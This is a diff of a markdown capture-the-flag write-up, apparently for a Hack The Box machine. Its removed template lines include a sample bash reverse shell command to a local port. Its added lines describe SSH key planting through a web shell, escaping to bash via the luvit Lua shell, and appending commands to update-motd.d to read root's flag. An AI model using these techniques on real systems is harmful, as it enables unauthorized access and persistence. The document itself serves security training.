@@ -77,58 +77,37 @@ In the `smevk.php` source in the repository, exactly as I had thought, led the a
 
 After successfully compromising the panel, I began to look around the directories. under `/home/webadmin/`, I found the `.ssh` folder. Now, from my NMap scan earlier, I know that SSH is open on this machine. So, I used the upload feature on the shell to upload my `id_rsa.pub` file (my public key) to the server's `authorized_keys` file, to allow me to easily ssh into the server without needing any passwords.
 
+![Authorized Keys](https://i.imgur.com/nQskYs4.png)
 
-Under
+After SSH'ing into the machine as `webadmin`, I took a look around and found that there was another user (which I saw earlier from the shell) called sysadmin. I needed access. I used ```console sudo -l``` to list user's privileges on the machine and found that the sysadmin user, could be logged in through `luvit` (an lua shell) in the `/home/sysadmin`. This was a nice suprise!
 
-```php
-function sqInRect($lng, $wdth) {
+![Sysadmin](https://i.imgur.com/SWP3eS5.png)
 
-    if($lng == $wdth) {
-      return null;
-    }
+From here, I simply ran ```console os.execute("/bin/bash")``` to get the familiar bash shell as the user.
 
-    $squares = array();
-
-    while($lng*$wdth >= 1) {
-      if($lng>$wdth) {
-        $base = $wdth;
-        $lng = $lng - $base;
-      }
-      else {
-        $base = $lng;
-        $wdth = $wdth - $base;
-      }
-      array_push($squares, $base);
-    }
-    return $squares;
-}
-```
-Above is the php code for the **Rectangle into Squares** kata solution from codewars.
+![Sysadmin](https://i.imgur.com/9UZLmNw.png)
 
 
 ## User Flag
 
-In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!
+From this shell, I was able to cd over to the `/home/` directory, where the user flag, contained in `cat.txt` was found.
 
-```
-x@wartop:~$ cat user.txt
-6u6baafnd3d54fc3b47squhp4e2bhk67
-```
+![User Flag](https://i.imgur.com/GzEB2Ji.png)
+
+# Getting Root Flag
+
+Now that I had found he user flag, the next target was the root flag. SO, I began to look around the files on the machine that I could access as this user.
+After a bit of searching around, I found two folders which had root permissions called 'update-manager' and 'update-motd.d'. Out of these two directories, update-motd.d was the one I was most interested in. This is because, typically motd's are ran as root on boot/when you SSH into the machine. 
+
+![User Flag](https://i.imgur.com/sLbTP5x.png)
+
 
 ## Root Flag
+So, I appended ```console cat /root/root.txt``` to the and of the file, so that the command would run the next time that I SSH'd into the machine and output the flag.
 
-The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.
+And that's exactly what it did!
 
-
-![Root](./images/root.png)
-\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka
-
+![Root Flag](https://i.imgur.com/Ka631pN.png)
 
 # Conclusion
-In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
-
-# References
-1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
-2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
-3. [https://hackthebox.eu](https://hackthebox.eu)
-4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)
+This was my first active box and I have to say that, I had a lot of fun! There was a lot of interesting little hints and secrets that I had to find and note during my reconnaissance that made a great impact later on. A lot of this box was about exploring through it, seeing what I can find and making use of what I did. I learned qutie a lot during this, but most notably about the existance of the lua language and its shells such as luvit, executing commands from root files, generating SSH keys and overwriting the authorized_keys file etc.
